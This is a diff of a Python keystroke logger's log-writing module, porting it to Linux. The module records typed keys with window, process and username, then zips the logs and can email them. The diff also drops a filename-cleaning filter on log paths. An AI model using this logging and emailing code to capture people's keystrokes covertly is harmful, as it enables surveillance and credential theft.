@@ -20,11 +20,18 @@
 ##
 ##############################################################################
 
-import win32api, win32con, win32process
-import os, os.path
+import os
+import os.path
+import sys
+if os.name == 'posix':
+    pass
+elif os.name == 'nt':
+    import win32api, win32con, win32process
+else:
+    print "OS is not recognised as windows or linux"
+    sys.exit()
 import time
 import re
-import sys
 import Queue
 import traceback
 import threading
@@ -38,7 +45,7 @@ import mytimer
 
 # the following are needed for zipping the logfiles
 import zipfile
-
+    
 # the following are needed for automatic emailing
 import smtplib
 
@@ -76,7 +83,7 @@ class LogWriter(threading.Thread):
         self.settings = settings
         self.cmdoptions = cmdoptions
         
-        self.filter = re.compile(r"[\\\/\:\*\?\"\<\>\|]+")      #regexp filter for the non-allowed characters in windows filenames.
+        self.filter = re.compile(r"[\\\/\:\*\?\"\<\>\|]+")    #regexp filter for the non-allowed characters in windows filenames.
         
         self.createLogger()
         #self.settings['General']['Log Directory'] = os.path.normpath(self.settings['General']['Log Directory'])
@@ -99,13 +106,8 @@ class LogWriter(threading.Thread):
         # initialize the automatic log flushing timer
         self.flushtimer = mytimer.MyTimer(float(self.settings['Log Maintenance']['Flush Interval']), 0, self.FlushLogWriteBuffers, ["Flushing file write buffers due to timer"])
         self.flushtimer.start()
-        
-        #~ # start the event queue processing
-        #~ self.queuetimer = mytimer.MyTimer(1, 1, self.start)
-        #~ self.queuetimer.start()
-        
+                
         # initialize some automatic zip stuff
-        #self.settings['Zip']['ziparchivename'] = "log_[date].zip"
         if self.settings['Zip']['Zip Enable'] == True:
             self.ziptimer = mytimer.MyTimer(float(self.settings['Zip']['Zip Interval'])*60*60, 0, self.ZipLogFiles)
             self.ziptimer.start()
@@ -152,7 +154,7 @@ class LogWriter(threading.Thread):
             self.logger.error("error creating log directory", exc_info=sys.exc_info())
         
         if self.settings['General']['System Log'] != 'None':
-            systemlogpath = os.path.join(self.settings['General']['Log Directory'], self.filter.sub(r'__',self.settings['General']['System Log']))
+            systemlogpath = os.path.join(self.settings['General']['Log Directory'], self.settings['General']['System Log'])
             systemloghandler = logging.FileHandler(systemlogpath)
             systemloghandler.setLevel(logging.DEBUG)
             systemloghandler.setFormatter(formatter)
@@ -170,7 +172,7 @@ class LogWriter(threading.Thread):
         ## if we are logging keystroke count, that field becomes the penultimate field. 
         ##
         ## event data: ascii if normal key, escaped if "special" key, escaped if csv separator
-        ## self.processName = self.GetProcessNameFromHwnd(event.Window) #fullapppath
+        ## self.processName = self.GetProcessName(event.Window) #fullapppath
         ## hwnd = event.Window
         ## username = os.environ['USERNAME']
         ## date = time.strftime('%Y%m%d') 
@@ -188,9 +190,9 @@ class LogWriter(threading.Thread):
         
         while not self.finished.isSet():
             try:
-                event = self.q.get()
-                
-                loggable = self.TestForNoLog(event)     # see if the program is in the no-log list.
+                event = self.q.get(timeout=0.5) #need the timeout so that thread terminates properly when exiting
+                #print event
+                loggable = self.TestForNoLog(event)  # see if the program is in the no-log list.
                 if not loggable:
                     if self.cmdoptions.debug: self.PrintDebug("not loggable, we are outta here\n")
                     continue
@@ -202,7 +204,7 @@ class LogWriter(threading.Thread):
                 
                 eventlisttmp = [time.strftime('%Y%m%d'), 
                                 time.strftime('%H%M'), 
-                                self.GetProcessNameFromHwnd(event.Window), 
+                                self.GetProcessName(event), 
                                 str(event.Window), 
                                 os.getenv('USERNAME'), 
                                 str(event.WindowName).replace(self.settings['General']['Log File Field Separator'], '[sep_key]')]
@@ -221,13 +223,12 @@ class LogWriter(threading.Thread):
                     self.eventlist = eventlisttmp
             ## don't need this with infinite timeout?
             except Queue.Empty:
-                self.PrintDebug("\nempty queue...\n")
                 pass #let's keep iterating
             except:
                 self.PrintDebug("some exception was caught in the logwriter loop...\nhere it is:\n", sys.exc_info())
                 pass #let's keep iterating
         
-        self.finished.set()
+        self.finished.set() #shouldn't ever need this, but just in case...
         
     def ParseEventValue(self, event):
         '''Pass the event ascii value through the requisite filters.
@@ -252,7 +253,7 @@ class LogWriter(threading.Thread):
         # need to parse the returns, so as not to break up the delimited data lines
         if event.Ascii == 13:
             return(npchrstr)
-        
+            
         #we translate all the special keys, such as arrows, backspace, into text strings for logging
         #exclude shift keys, because they are already represented (as capital letters/symbols)
         if event.Ascii == 0 and not (str(event.Key).endswith('shift') or str(event.Key).endswith('Capital')):
@@ -278,10 +279,10 @@ class LogWriter(threading.Thread):
         '''This function returns False if the process name associated with an event
         is listed in the noLog option, and True otherwise.'''
         
-        self.processName = self.GetProcessNameFromHwnd(event.Window)
+        self.processName = self.GetProcessName(event)
         if self.settings['General']['Applications Not Logged'] != 'None':
             for path in self.settings['General']['Applications Not Logged'].split(';'):
-                if os.stat(path) == os.stat(self.processName):    #we use os.stat instead of comparing strings due to multiple possible representations of a path
+                if os.stat(path) == os.stat(self.processName):  #we use os.stat instead of comparing strings due to multiple possible representations of a path
                     return False
         return True
 
@@ -314,7 +315,7 @@ class LogWriter(threading.Thread):
             for fname in files:
                 #if fname != self.settings['ziparchivename']:
                 if not self.CheckIfZipFile(fname):
-                    myzip.write(os.path.join(root,fname).split("\\",1)[1])
+                    myzip.write(os.path.join(root,fname).split(os.sep,1)[1])
         
         myzip.close()
         myzip = zipfile.ZipFile(zipFileName, "r", zipfile.ZIP_DEFLATED)
@@ -322,15 +323,17 @@ class LogWriter(threading.Thread):
             self.PrintDebug("Warning: Zipfile did not pass check.\n")
         myzip.close()
         
+        # chdir back
+        os.chdir(originalDir)
+        
+        
         # write the name of the last completed zip file
         # so that we can check against this when emailing or ftping, to make sure
         # we do not try to transfer a zipfile which is in the process of being created
+        
         ziplog=open(os.path.join(self.settings['General']['Log Directory'], "ziplog.txt"), 'w')
         ziplog.write(zipFileName)
         ziplog.close()
-        
-        # chdir back
-        os.chdir(originalDir)
         
         #now we can delete all the logs that have not been modified since we made the zip. 
         self.DeleteOldLogs(zipFileRawTime)
@@ -475,8 +478,8 @@ class LogWriter(threading.Thread):
         # do stuff only if file is closed. if it is open, we don't have to do anything at all, just return true.
         if self.log == None: 
             # Filter out any characters that are not allowed as a windows filename, just in case the user put them into the config file
-            self.settings['General']['Log File'] = self.filter.sub(r'__',self.settings['General']['Log File'])
-            self.writeTarget = os.path.normpath(os.path.join(self.settings['General']['Log Directory'], self.settings['General']['Log File']))
+            #self.settings['General']['Log File'] = self.filter.sub(r'__',self.settings['General']['Log File'])
+            self.writeTarget = os.path.join(self.settings['General']['Log Directory'], self.settings['General']['Log File'])
             try:
                 self.log = open(self.writeTarget, 'a')
                 self.PrintDebug("writing to: " + self.writeTarget)
@@ -519,7 +522,7 @@ class LogWriter(threading.Thread):
         Then, openlogfile will take care of opening a fresh logfile by itself.'''
         
         if self.log != None:
-            rotateTarget = os.path.normpath(os.path.join(self.settings['General']['Log Directory'], time.strftime("%Y%m%d_%H%M%S") + '_' + self.settings['General']['Log File']))
+            rotateTarget = os.path.join(self.settings['General']['Log Directory'], time.strftime("%Y%m%d_%H%M%S") + '_' + self.settings['General']['Log File'])
             self.PrintDebug("\nRenaming\n" + self.writeTarget + "\nto\n" + rotateTarget + "\n")
             self.log.close()
             self.log = None
@@ -547,7 +550,7 @@ class LogWriter(threading.Thread):
                 elif type(lastmodcutoff) == float:
                     testvalue = os.path.getmtime(os.path.join(root,fname)) < lastmodcutoff
                 
-                if fname == "emaillog.txt" or fname == "ziplog.txt":
+                if fname == "emaillog.txt" or fname == "ziplog.txt" or fname == self.settings['General']['Log File']:
                     testvalue = False # we don't want to delete these
                 
                 if type(lastmodcutoff) == float and self.CheckIfZipFile(fname):
@@ -563,16 +566,26 @@ class LogWriter(threading.Thread):
                     except:
                         self.PrintDebug(str(sys.exc_info()[0]) + ", " + str(sys.exc_info()[1]) + "\n")
 
-    def GetProcessNameFromHwnd(self, hwnd):
+    def GetProcessName(self, event):
         '''Acquire the process name from the window handle for use in the log filename.
         '''
-        threadpid, procpid = win32process.GetWindowThreadProcessId(hwnd)
-        
-        # PROCESS_QUERY_INFORMATION (0x0400) or PROCESS_VM_READ (0x0010) or PROCESS_ALL_ACCESS (0x1F0FFF)
-        
-        mypyproc = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, procpid)
-        procname = win32process.GetModuleFileNameEx(mypyproc, 0)
-        return procname
+        if os.name == 'nt':
+            hwnd = event.Window
+            try:
+                threadpid, procpid = win32process.GetWindowThreadProcessId(hwnd)
+                
+                # PROCESS_QUERY_INFORMATION (0x0400) or PROCESS_VM_READ (0x0010) or PROCESS_ALL_ACCESS (0x1F0FFF)
+                
+                mypyproc = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, procpid)
+                procname = win32process.GetModuleFileNameEx(mypyproc, 0)
+                return procname
+            except:
+                #self.logger.error("Failed to get process info from hwnd.", exc_info=sys.exc_info())
+                # this happens frequently enough - when the last event caused the closure of the window or program
+                # so we just return a nice string and don't worry about it.
+                return "noprocname"
+        elif os.name == 'posix':
+            return str(event.WindowProcName)
 
     def cancel(self):
         '''To exit cleanly, flush all write buffers, and stop all running timers.
@@ -585,34 +598,51 @@ class LogWriter(threading.Thread):
         self.WriteToLogFile()
         self.FlushLogWriteBuffers("Flushing buffers prior to exiting")
         logging.shutdown()
-        self.flushtimer.cancel()
         
+        self.flushtimer.cancel()
         self.logrotatetimer.cancel()
         
         if self.settings['E-mail']['SMTP Send Email'] == True:
             self.emailtimer.cancel()
         if self.settings['Log Maintenance']['Delete Old Logs'] == True:
             self.oldlogtimer.cancel()
-        #~ if self.settings['Timestamp']['Timestamp Enable'] == True:
-            #~ self.timestamptimer.cancel()
         if self.settings['Zip']['Zip Enable'] == True:
             self.ziptimer.cancel()
-        
-
+            
 if __name__ == '__main__':
     #some testing code
     #put a real existing hwnd into event.Window to run test
-    #this testing code is now really outdated and useless.
-    lw = LogWriter()
-    class Blank:
-        pass
-    event = Blank()
-    event.Window = 264854
-    event.WindowName = "Untitled - Notepad"
-    event.Ascii = 65
-    event.Key = 'A'
-    options = Blank()
-    options.parseBackspace = options.parseEscape = options.addLineFeed = options.debug = False
-    options.flushKey = 'F11'
-    lw.WriteToLogFile(event, options)
+    #this testing code is incomplete (no events)
+    
+    class CmdOptions:
+        def __init__(self, debug):
+            self.debug = debug
+    
+    settings={}
+    settings['E-mail'] = {'SMTP Send Email':False}
+    settings['Log Maintenance'] = {'Delete Old Logs':False,'Flush Interval':1000,'Log Rotation Interval':4,'Delete Old Logs':False}
+    settings['Zip'] = {'Zip Enable':False}
+    settings['General'] = {'Log Directory':'logs','System Log':'None','Log Key Count':True}
+    
+    print settings['General']
+    print settings['General']['Log Directory']
+    q = Queue.Queue()
+    
+    cmdoptions = CmdOptions(True)
+    
+    lw = LogWriter(settings, cmdoptions, q)
+    lw.start()
+    time.sleep(5)
+    lw.cancel()
+    #~ class Blank:
+        #~ pass
+    #~ event = Blank()
+    #~ event.Window = 264854
+    #~ event.WindowName = "Untitled - Notepad"
+    #~ event.Ascii = 65
+    #~ event.Key = 'A'
+    #~ options = Blank()
+    #~ options.parseBackspace = options.parseEscape = options.addLineFeed = options.debug = False
+    #~ options.flushKey = 'F11'
+    #~ lw.WriteToLogFile(event, options)
     
